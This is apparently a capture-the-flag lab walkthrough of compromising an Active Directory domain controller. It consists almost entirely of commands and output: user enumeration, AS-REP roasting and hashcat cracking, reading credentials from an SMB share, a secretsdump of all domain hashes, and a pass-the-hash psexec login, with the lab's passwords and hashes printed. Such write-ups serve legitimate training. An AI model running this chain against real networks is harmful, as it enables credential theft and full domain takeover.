# Setup

```bash
exegol start ad ad --vpn ..\Downloads\Drachh.ovpn --desktop
```

Time synch with DC : 

```bash
ntpdig -s -S -M 500 -t 1 10.10.139.202
2025-03-16 11:28:58.917966 (+0100) +14.710770 +/- 0.017438 10.10.139.202 s1 no-leap
CLOCK: step_systime: Operation not permitted

faketime "2025-03-16 11:27:53" zsh
```

```
ll
total 1.1M
-rw-rw---- 1 root root 556K Mar 16 11:44 password_list
-rw-rw---- 1 root root 528K Mar 16 11:44 user_list
```

# Reconnaissance

```bash
nxc smb 10.10.139.202 -u '' -p '' -M ioxidresolver
```

```plaintext
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [+] spookysec.local\:
IOXIDRES... 10.10.139.202   445    ATTACKTIVEDIREC  Address: 10.10.139.202
```

```bash
nxc ldap 10.10.139.202 -u '' -p ''
```

```
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
LDAP        10.10.139.202   389    ATTACKTIVEDIREC  [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        10.10.139.202   389    ATTACKTIVEDIREC  [+] spookysec.local\:
```

```bash
kerbrute userenum --dc 10.10.139.202 --domain spookysec.local user_list

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 03/16/25 - Ronnie Flathers @ropnop

2025/03/16 11:45:15 >  Using KDC(s):
2025/03/16 11:45:15 >   10.10.139.202:88

2025/03/16 11:45:15 >  [+] VALID USERNAME:       james@spookysec.local
2025/03/16 11:45:15 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/03/16 11:45:16 >  [+] VALID USERNAME:       James@spookysec.local
2025/03/16 11:45:17 >  [+] VALID USERNAME:       robin@spookysec.local
2025/03/16 11:45:20 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/03/16 11:45:22 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/03/16 11:45:26 >  [+] VALID USERNAME:       backup@spookysec.local
2025/03/16 11:45:28 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/03/16 11:45:39 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/03/16 11:45:44 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/03/16 11:46:14 >  [+] VALID USERNAME:       Administrator@spookysec.local
```

```
cat domain_users
james
svc-admin
James
robin
darkstar
administrator
backup
paradox
JAMES
Robin
Administrator
```

```
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile domain_users -dc-ip "10.10.139.202" "spookysec.local"/
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:cd4e9de0001e81978f6d7dfc4ebcf81f$385d66f32078f170d0928cc56c198bdae699429427b564240303972d1e667bff0d2eccec72235b538d9a14f565c382f885dcf28f52c7b838b300d306dbfbc381e31e4a64848f04d64946f6100723928538bf58ce003090f45753c364aa0214de5129920c2ae0d1f842bd47630b3c68381a59d5f0ef45a0ba20771f0d055c34ba5c05365c69d6b4c46397383a8af83a01eec50272d1f9328d87c280a342903c2b4691993ac4a363437e8af8eaddcd668bd824da026d9c772e9a23a82b589d295a62e79b60329b8e7199293c585c8bf2c1e08334724c0e10e613b33e7ef9810f8f76a790b10682b0a274c578f363e1ce896778
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```



```bash
hashcat -m 18200 -a 0 ASREProastables.txt password_list
```

Creds : `svc-admin:management2005`

```
nxc smb 10.10.139.202 -u 'svc-admin' -p 'management2005' --users
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         10.10.139.202   445    ATTACKTIVEDIREC  -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.139.202   445    ATTACKTIVEDIREC  Administrator                 2020-09-17 22:53:28 0       Built-in account for administering the computer/domain
SMB         10.10.139.202   445    ATTACKTIVEDIREC  Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.139.202   445    ATTACKTIVEDIREC  krbtgt                        2020-04-04 18:40:08 0       Key Distribution Center Service Account
SMB         10.10.139.202   445    ATTACKTIVEDIREC  skidy                         2020-04-04 18:44:07 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  breakerofthings               2020-04-04 18:51:31 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  james                         2020-04-04 18:51:53 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  optional                      2020-04-04 18:52:32 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  sherlocksec                   2020-04-04 18:52:56 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  darkstar                      2020-04-04 18:53:17 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  Ori                           2020-04-04 18:53:46 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  robin                         2020-04-04 18:54:08 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  paradox                       2020-04-04 18:54:29 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  Muirland                      2020-04-04 18:55:01 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  horshark                      2020-04-04 18:55:29 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  svc-admin                     2020-04-04 18:57:56 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  backup                        2020-04-04 19:57:05 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  a-spooks                      2020-09-17 23:02:20 0
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Enumerated 17 local users: THM-AD
```

```
nxc smb 10.10.139.202 -u 'svc-admin' -p 'management2005' --shares
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         10.10.139.202   445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.10.139.202   445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.139.202   445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.139.202   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.139.202   445    ATTACKTIVEDIREC  backup          READ
SMB         10.10.139.202   445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.139.202   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.139.202   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.139.202   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

```
smbclient //spookysec.local/backup -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3558485 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

```
cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw


cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```


```
secretsdump spookysec.local/backup:backup2517860@10.10.139.202
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:1c6dbf977becbfaae3aed6b869861ee6:::
```

```
psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc" "spookysec.local/Administrator@10.10.139.202"
```